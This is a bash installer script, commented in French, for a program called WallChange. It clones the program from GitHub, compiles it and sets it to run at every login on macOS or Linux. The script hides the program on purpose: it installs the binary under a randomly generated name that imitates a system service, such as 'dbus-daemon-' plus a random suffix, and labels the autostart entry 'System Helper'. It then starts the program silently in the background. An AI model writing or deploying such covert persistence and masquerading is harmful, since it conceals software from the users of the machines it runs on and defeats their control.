#!/bin/bash

# Fonction pour afficher les erreurs et quitter
fail() {
    echo "ERROR: $1"
    exit 1
}

# Détection de l'OS
OS_NAME=$(uname -s)
if [[ "$OS_NAME" == "Darwin" ]]; then
    IS_MAC=1
    echo "Platform: macOS"
else
    IS_MAC=0
    echo "Platform: Linux"
fi

# Variables
REPO_URL="https://github.com/Zeky69/WallChange.git"
INSTALL_DIR="$HOME/.local/bin"

if [ "$IS_MAC" -eq 1 ]; then
    AUTOSTART_DIR="$HOME/Library/LaunchAgents"
else
    AUTOSTART_DIR="$HOME/.config/autostart"
fi

CLONE_DIR="$HOME/.wallchange_source"
PROCESS_NAME_FILE="$HOME/.zlsw"
LOG_FILE="$HOME/.local/state/wallchange/client.log"

# Fonction pour générer un nom de processus aléatoire
generate_random_name() {
    local prefixes=("sys" "usr" "lib" "dbus" "gvfs" "gnome" "kde" "xdg" "pulseaudio" "pipewire" "session" "desktop" "display" "input" "audio" "video" "notify" "update" "sync" "cache")
    local suffixes=("helper" "daemon" "service" "worker" "monitor" "agent" "manager" "handler" "launcher" "watcher" "server" "client" "bridge" "proxy" "wrapper")
    local prefix=${prefixes[$RANDOM % ${#prefixes[@]}]}
    local suffix=${suffixes[$RANDOM % ${#suffixes[@]}]}
    local random_str=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 4 | head -n 1)
    echo "${prefix}-${suffix}-${random_str}"
}

# 1. Récupération du projet
echo "Step 1: Fetching project..."
if [ -d ".git" ] && grep -q "WallChange" .git/config 2>/dev/null; then
    PROJECT_DIR=$(pwd)
else
    if [ -d "$CLONE_DIR" ]; then
        cd "$CLONE_DIR" || fail "Cannot access $CLONE_DIR"
        # Reset le repo local pour éviter les conflits de branches divergentes
        git fetch -q origin master || fail "Git fetch failed"
        git reset -q --hard origin/master || fail "Git reset failed"
    else
        git clone -q -b master "$REPO_URL" "$CLONE_DIR" || fail "Git clone failed"
        cd "$CLONE_DIR" || fail "Cannot access $CLONE_DIR"
    fi
    PROJECT_DIR="$CLONE_DIR"
fi

# 2. Compilation
echo "Step 2: Compiling..."
cd "$PROJECT_DIR" || fail "Cannot change directory to $PROJECT_DIR"
make clean > /dev/null 2>&1

COMPILE_LOG=$(mktemp)
if make > "$COMPILE_LOG" 2>&1; then
    rm "$COMPILE_LOG"
else
    echo "Compilation failed. Output:"
    cat "$COMPILE_LOG"
    rm "$COMPILE_LOG"
    fail "Make command returned non-zero exit code"
fi

# 3. Installation des binaires
echo "Step 3: Installing binaries..."
mkdir -p "$INSTALL_DIR" || fail "Cannot create $INSTALL_DIR"
mkdir -p "$AUTOSTART_DIR" || fail "Cannot create $AUTOSTART_DIR"
mkdir -p "$(dirname "$LOG_FILE")" || fail "Cannot create log directory"

# Arrêter et supprimer l'ancien processus avec nom aléatoire
if [ -f "$PROCESS_NAME_FILE" ]; then
    OLD_PROCESS_NAME=$(cat "$PROCESS_NAME_FILE")
    pkill -f "$OLD_PROCESS_NAME" 2>/dev/null || true
    rm -f "$INSTALL_DIR/$OLD_PROCESS_NAME" 2>/dev/null
fi

# Rotation des logs
if [ -f "$LOG_FILE" ]; then
    mv "$LOG_FILE" "${LOG_FILE}.old"
    echo "Log rotated." > "$LOG_FILE"
fi

# Arrêter le processus wallchange (anciennes installations)
pkill -x wallchange 2>/dev/null || true

sleep 1

NEW_PROCESS_NAME=$(generate_random_name)
echo "$NEW_PROCESS_NAME" > "$PROCESS_NAME_FILE"

# Copier le binaire
if [ -f "wallchange" ]; then
    rm -f "$INSTALL_DIR/$NEW_PROCESS_NAME"
    cp wallchange "$INSTALL_DIR/$NEW_PROCESS_NAME" || fail "Failed to copy binary to $INSTALL_DIR/$NEW_PROCESS_NAME"
    chmod +x "$INSTALL_DIR/$NEW_PROCESS_NAME"

    # Copier aussi sous le nom wallchange
    rm -f "$INSTALL_DIR/wallchange"
    cp wallchange "$INSTALL_DIR/wallchange" || fail "Failed to copy binary to $INSTALL_DIR/wallchange"
    chmod +x "$INSTALL_DIR/wallchange"
else
    fail "Binary 'wallchange' not found after compilation"
fi

# 4. Configuration du lancement automatique
echo "Step 4: Configuring autostart..."

CMD_SCRIPT="PNAME=\$(cat $PROCESS_NAME_FILE 2>/dev/null); if [ -n \"\$PNAME\" ] && [ -f \"$INSTALL_DIR/\$PNAME\" ]; then \"$INSTALL_DIR/\$PNAME\" >> \"$LOG_FILE\" 2>&1; fi"

if [ "$IS_MAC" -eq 1 ]; then
    PLIST_FILE="$AUTOSTART_DIR/com.wallchange.autostart.plist"
    cat > "$PLIST_FILE" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.wallchange.autostart</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>$CMD_SCRIPT</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StandardOutPath</key>
    <string>$LOG_FILE</string>
    <key>StandardErrorPath</key>
    <string>$LOG_FILE</string>
</dict>
</plist>
EOF
else
    DESKTOP_FILE="$AUTOSTART_DIR/wallchange.desktop"
    cat > "$DESKTOP_FILE" <<EOF
[Desktop Entry]
Type=Application
Exec=/bin/bash -c '$CMD_SCRIPT'
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=System Helper
Comment=System session helper
EOF
fi

# 5. Création de l'alias
echo "Step 5: Setting up alias..."
SHELL_RC="$HOME/.bashrc"
if [[ "$SHELL" == */zsh ]]; then
    SHELL_RC="$HOME/.zshrc"
fi

if ! grep -q "alias wallchange=" "$SHELL_RC" 2>/dev/null; then
    echo "" >> "$SHELL_RC"
    echo "# Alias Wallchange" >> "$SHELL_RC"
    echo "alias wallchange='$INSTALL_DIR/wallchange'" >> "$SHELL_RC"
fi

# Lancer le processus en arrière-plan
echo "--- Started at $(date) ---" >> "$LOG_FILE"
echo "Starting process..."

nohup "$INSTALL_DIR/$NEW_PROCESS_NAME" >> "$LOG_FILE" 2>&1 &
disown

echo "successful"
